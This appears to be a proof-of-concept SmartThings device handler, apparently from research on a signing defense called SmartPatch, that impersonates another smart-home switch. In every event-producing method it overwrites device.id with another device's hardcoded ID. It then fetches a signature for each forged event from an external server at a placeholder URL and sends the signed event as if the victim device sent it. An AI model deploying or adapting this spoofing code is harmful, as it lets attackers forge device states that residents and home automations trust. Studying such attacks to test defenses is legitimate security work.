//import UUID to generate ID0
import java.util.UUID

/**
 *  Copyright 2015 SmartThings
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
metadata {

    definition (name: "ZZ mimic attack Signed Simulated Switch", namespace: "000", author: "SmartPatch", runLocally: false, mnmn: "SmartThings", vid: "generic-switch") {
        capability "Switch"
        capability "Relay Switch"
        capability "Sensor"
        capability "Actuator"
        capability "Health Check"

        command "onPhysical"
        command "offPhysical"

        command    "markDeviceOnline"
        command    "markDeviceOffline"
    }
    // simulator metadata
	simulator {
		// TODO: define status and reply messages here
		status "on":  "on"
		status "off": "off"
	}



    tiles {
        standardTile("switch", "device.switch", width: 2, height: 2, canChangeIcon: true) {
            state "off", label: '${currentValue}', action: "switch.on", icon: "st.switches.switch.off", backgroundColor: "#ffffff"
            state "on", label: '${currentValue}', action: "switch.off", icon: "st.switches.switch.on", backgroundColor: "#00A0DC"
        }
        standardTile("on", "device.switch", decoration: "flat") {
            state "default", label: 'On', action: "onPhysical", backgroundColor: "#ffffff"
        }
        standardTile("off", "device.switch", decoration: "flat") {
            state "default", label: 'Off', action: "offPhysical", backgroundColor: "#ffffff"
        }
        standardTile("deviceHealthControl", "device.healthStatus", decoration: "flat", width: 1, height: 1, inactiveLabel: false) {
            state "online",  label: "ONLINE", backgroundColor: "#00A0DC", action: "markDeviceOffline", icon: "st.Health & Wellness.health9", nextState: "goingOffline", defaultState: true
            state "offline", label: "OFFLINE", backgroundColor: "#E86D13", action: "markDeviceOnline", icon: "st.Health & Wellness.health9", nextState: "goingOnline"
            state "goingOnline", label: "Going ONLINE", backgroundColor: "#FFFFFF", icon: "st.Health & Wellness.health9"
            state "goingOffline", label: "Going OFFLINE", backgroundColor: "#FFFFFF", icon: "st.Health & Wellness.health9"
        }
        main "switch"
        details(["switch","on","off","deviceHealthControl"])
    }
}

def installed() {
    log.trace "Executing 'installed'"
    
    //mimic attack
    //get real device ID of 0-7-ZZ-Signed-Simulated-Switch
    state.otherDeviceid = "379f62ab-3adf-4f8d-bc2a-0706d18f8dd9"
    
    //generate ID0
    state.ID0 = UUID.randomUUID().toString()
    
    //the url and path of the external web server
    //uri: should be changed if the external web server changes (ngrok http 8086)
    //path: just copy the path in the java codes of web server
    
    state.URL = "http://xxx.com"
    state.PATH = "/work"
    
    markDeviceOnline()
    off()
    initialize()
}

def updated() {
    log.trace "Executing 'updated'"
    initialize()
}

def markDeviceOnline() {
    setDeviceHealth("online")
}

def markDeviceOffline() {
    setDeviceHealth("offline")
}

private setDeviceHealth(String healthState) {
    log.debug("healthStatus: ${device.currentValue('healthStatus')}; DeviceWatch-DeviceStatus: ${device.currentValue('DeviceWatch-DeviceStatus')}")
    // ensure healthState is valid
    List validHealthStates = ["online", "offline"]
    healthState = validHealthStates.contains(healthState) ? healthState : device.currentValue("healthStatus")
    // set the healthState
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "DeviceWatch-DeviceStatus", value: healthState]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "DeviceWatch-DeviceStatus", value: healthState)
    // new sendEvent is:
    sendEvent(name: "DeviceWatch-DeviceStatus", value: healthState, data: [sign: "${signatureResult}"])
    
    
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "healthStatus", value: healthState]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "healthStatus", value: healthState)
    // new sendEvent is:
    sendEvent(name: "healthStatus", value: healthState, data: [sign: "${signatureResult}"])
}

private initialize() {
    log.trace "Executing 'initialize'"
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "DeviceWatch-Enroll", value: [protocol: "cloud", scheme:"untracked"].encodeAsJson(), displayed: false]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "DeviceWatch-Enroll", value: [protocol: "cloud", scheme:"untracked"].encodeAsJson(), displayed: false)
    // new sendEvent is:
    sendEvent(name: "DeviceWatch-Enroll", value: [protocol: "cloud", scheme:"untracked"].encodeAsJson(), displayed: false, data: [sign: "${signatureResult}"])
}

def parse(description) {
	log.debug "parse $description"
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each createEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "switch", value: "$description"]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal createEvent
    // orignal createEvent is:
    //def result = createEvent(name: "switch", value: "$description")
    // new sendEvent is:
    def result = createEvent(name: "switch", value: "$description",data: [sign: "${signatureResult}"])
    log.trace "$result"
    return result
}

def on() {
    log.debug "$version on()"
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "switch", value: "on"]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "switch", value: "on")
    // new sendEvent is:
    sendEvent(name: "switch", value: "on", data: [sign: "${signatureResult}"])
}

def off() {
    log.debug "$version off()"
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "switch", value: "off"]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "switch", value: "off")
    // new sendEvent is:
    sendEvent(name: "switch", value: "off", data: [sign: "${signatureResult}"])
}

def onPhysical() {
    log.debug "$version onPhysical()"
    
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: state.ID0, deviceID: device.id, func: "sign", name: "switch", value: "on", type: "physical"]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "switch", value: "on", type: "physical")
    // new sendEvent is:
    sendEvent(name: "switch", value: "on", type: "physical", data: [sign: "${signatureResult}"])
}

def offPhysical() {
    log.debug "$version offPhysical()"
    
    
    
    // avoid mulitiple time definition
    def params = null
    def signatureResult = null
    
    
    // each time to sendEvent/creatEvent, change its device.id to mimic other device(0-7-ZZ-Signed-Simulated-Switch)
    device.id = state.otherDeviceid
    
    // before each sendEvent, collects the fileds of event, both the field names and field values
    // then send the ID0 and event fields to the web server for signatureResult  
    // query: copy the parameters in the sendEvent, and add the ID0 and deviceID into it
    // also, tell the web server that this is for signature func: "sign", 
    params = [
        uri: state.URL,
        path: state.PATH,
        query: [ID0: "4e747bfe-b725-4691-a92a-abfc426bff86", deviceID: device.id, func: "sign", name: "switch", value: "off", type: "physical"]
    ]
    
    // get the signatureResult from the external web server
    signatureResult = null
    try {
        httpGet(params) { resp ->
            signatureResult = resp.data
            log.debug "response data: ${signatureResult}"
        }
    } catch (e) {
        log.error "something went wrong: $e"
    }
    
    // put the signatureResult into the event and replace the orignal sendEvent
    // orignal sendEvent is:
    //sendEvent(name: "switch", value: "off", type: "physical")
    // new sendEvent is:
    sendEvent(name: "switch", value: "off", type: "physical", data: [sign: "${signatureResult}"])
}

private getVersion() {
    "PUBLISHED"
}
